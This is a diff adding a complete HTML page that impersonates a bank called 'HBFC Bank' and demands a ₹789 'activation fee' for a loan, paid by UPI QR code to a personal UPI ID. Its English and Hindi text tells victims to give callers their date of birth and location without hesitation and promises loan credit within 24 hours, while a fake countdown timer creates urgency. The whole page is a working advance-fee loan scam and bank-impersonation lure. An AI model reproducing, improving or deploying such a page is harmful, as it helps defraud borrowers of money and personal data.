@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HBFC Bank - Payment Gateway</title>
+    <style>
+        :root {
+            --hbfc-blue: #004c8f;
+            --success-green: #28a745;
+            --warning-red: #d32f2f;
+        }
+        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background-color: #f4f7f9; color: #333; line-height: 1.5; }
+        
+        .header { background: white; padding: 15px; text-align: center; border-bottom: 2px solid #eee; }
+        .header h2 { margin: 0; color: var(--hbfc-blue); font-size: 18px; }
+
+        .timer-box { 
+            background: #fff3e0; color: #e65100; padding: 10px; text-align: center; 
+            font-weight: bold; font-size: 20px; border-bottom: 1px solid #ffe0b2;
+        }
+
+        .container { padding: 20px; max-width: 500px; margin: 0 auto; }
+        
+        /* QR Code Styling */
+        .qr-card { background: white; border-radius: 15px; padding: 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        .qr-card img { width: 200px; height: 200px; margin: 10px 0; border: 1px solid #eee; padding: 10px; border-radius: 10px; }
+        .amount-text { font-size: 24px; font-weight: bold; color: var(--hbfc-blue); margin: 10px 0; }
+        .upi-id { font-size: 14px; color: #666; background: #f0f0f0; padding: 5px 10px; border-radius: 5px; }
+
+        /* Instruction Section */
+        .info-card { background: white; border-radius: 12px; padding: 20px; border-left: 5px solid var(--hbfc-blue); margin-bottom: 20px; }
+        .lang-section { margin-bottom: 20px; border-bottom: 1px dashed #ccc; padding-bottom: 15px; }
+        .lang-section:last-child { border-bottom: none; }
+        h3 { font-size: 16px; margin-top: 0; color: var(--hbfc-blue); }
+        p { font-size: 13.5px; margin: 8px 0; text-align: justify; }
+        
+        .note-box { background: #fef9c3; border: 1px solid #fde047; padding: 10px; border-radius: 8px; font-weight: 500; font-size: 13px; }
+
+        .btn-understand {
+            width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 18px;
+            font-weight: bold; color: white; background-color: var(--hbfc-blue); cursor: pointer;
+            transition: 0.3s; margin-top: 10px;
+        }
+
+        /* Buffer Loader */
+        .loader { display: none; text-align: center; margin-top: 15px; }
+        .spinner {
+            width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid var(--hbfc-blue);
+            border-radius: 50%; animation: spin 1s linear infinite; display: inline-block;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h2>Secure Activation Payment</h2>
+    </div>
+
+    <div class="timer-box" id="timer">23:59:59</div>
+
+    <div class="container">
+        <div class="qr-card">
+            <p style="margin:0; color:#666;">Scan QR to Pay Fees</p>
+            <div class="amount-text">₹789.00</div>
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=s.kumar.1284@superyes%26pn=HBFC%20Bank%26am=789%26cu=INR" alt="UPI QR Code">
+            <div><span class="upi-id">s.kumar.1284@superyes</span></div>
+        </div>
+
+        <div class="info-card">
+            <div class="lang-section">
+                <h3>Contact & Verification Process</h3>
+                <p>After successful payment, our verification officers will contact you within 15 to 20 minutes. Please keep your phone in a good network area. They may ask for your date of birth or location for verification; please answer without hesitation.</p>
+                <p>If you don't receive a call, do not worry. Calls are only made if documents appear weak. For strong profiles, the loan amount will be directly credited to your bank account within 30 minutes to 24 hours.</p>
+            </div>
+
+            <div class="lang-section">
+                <h3>संपर्क और सत्यापन प्रक्रिया</h3>
+                <p>सफल भुगतान के 15 से 20 मिनट बाद हमारे अधिकारी आपसे संपर्क करेंगे। अपना फोन ऐसी जगह रखें जहाँ सिग्नल अच्छा हो। वे सत्यापन के लिए आपकी जन्मतिथि या स्थान पूछ सकते हैं; कृपया बिना किसी हिचकिचाहट के जवाब दें।</p>
+                <p>यदि कॉल नहीं आता है, तो घबराने की बात नहीं है। यह प्रक्रिया केवल दस्तावेज़ कमजोर होने पर ही होती है। यदि आपके दस्तावेज़ मजबूत हैं, तो कॉल नहीं आएगा और अगले 30 मिनट से 24 घंटे के भीतर लोन राशि आपके खाते में जमा कर दी जाएगी।</p>
+            </div>
+
+            <div class="note-box">
+                <b>Please Note:</b> EMI will be automatically deducted from your account between the 1st and 5th of every month.<br>
+                <b>कृपया ध्यान दें:</b> हर महीने की 1 से 5 तारीख के बीच आपके खाते से ईएमआई स्वचालित रूप से काट ली जाएगी।
+            </div>
+        </div>
+
+        <button class="btn-understand" onclick="completeProcess()">I UNDERSTAND</button>
+        
+        <div class="loader" id="buffer">
+            <div class="spinner"></div>
+            <p style="font-size: 14px; color: var(--hbfc-blue);">Saving your preferences...</p>
+        </div>
+    </div>
+
+    <script>
+        // 24 Hour Countdown Timer
+        let time = 24 * 60 * 60;
+        const timerEl = document.getElementById('timer');
+
+        function updateTimer() {
+            let h = Math.floor(time / 3600);
+            let m = Math.floor((time % 3600) / 60);
+            let s = time % 60;
+            timerEl.innerText = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+            if (time > 0) time--;
+        }
+        setInterval(updateTimer, 1000);
+
+        // Redirect Logic
+        function completeProcess() {
+            document.getElementById('buffer').style.display = 'block';
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
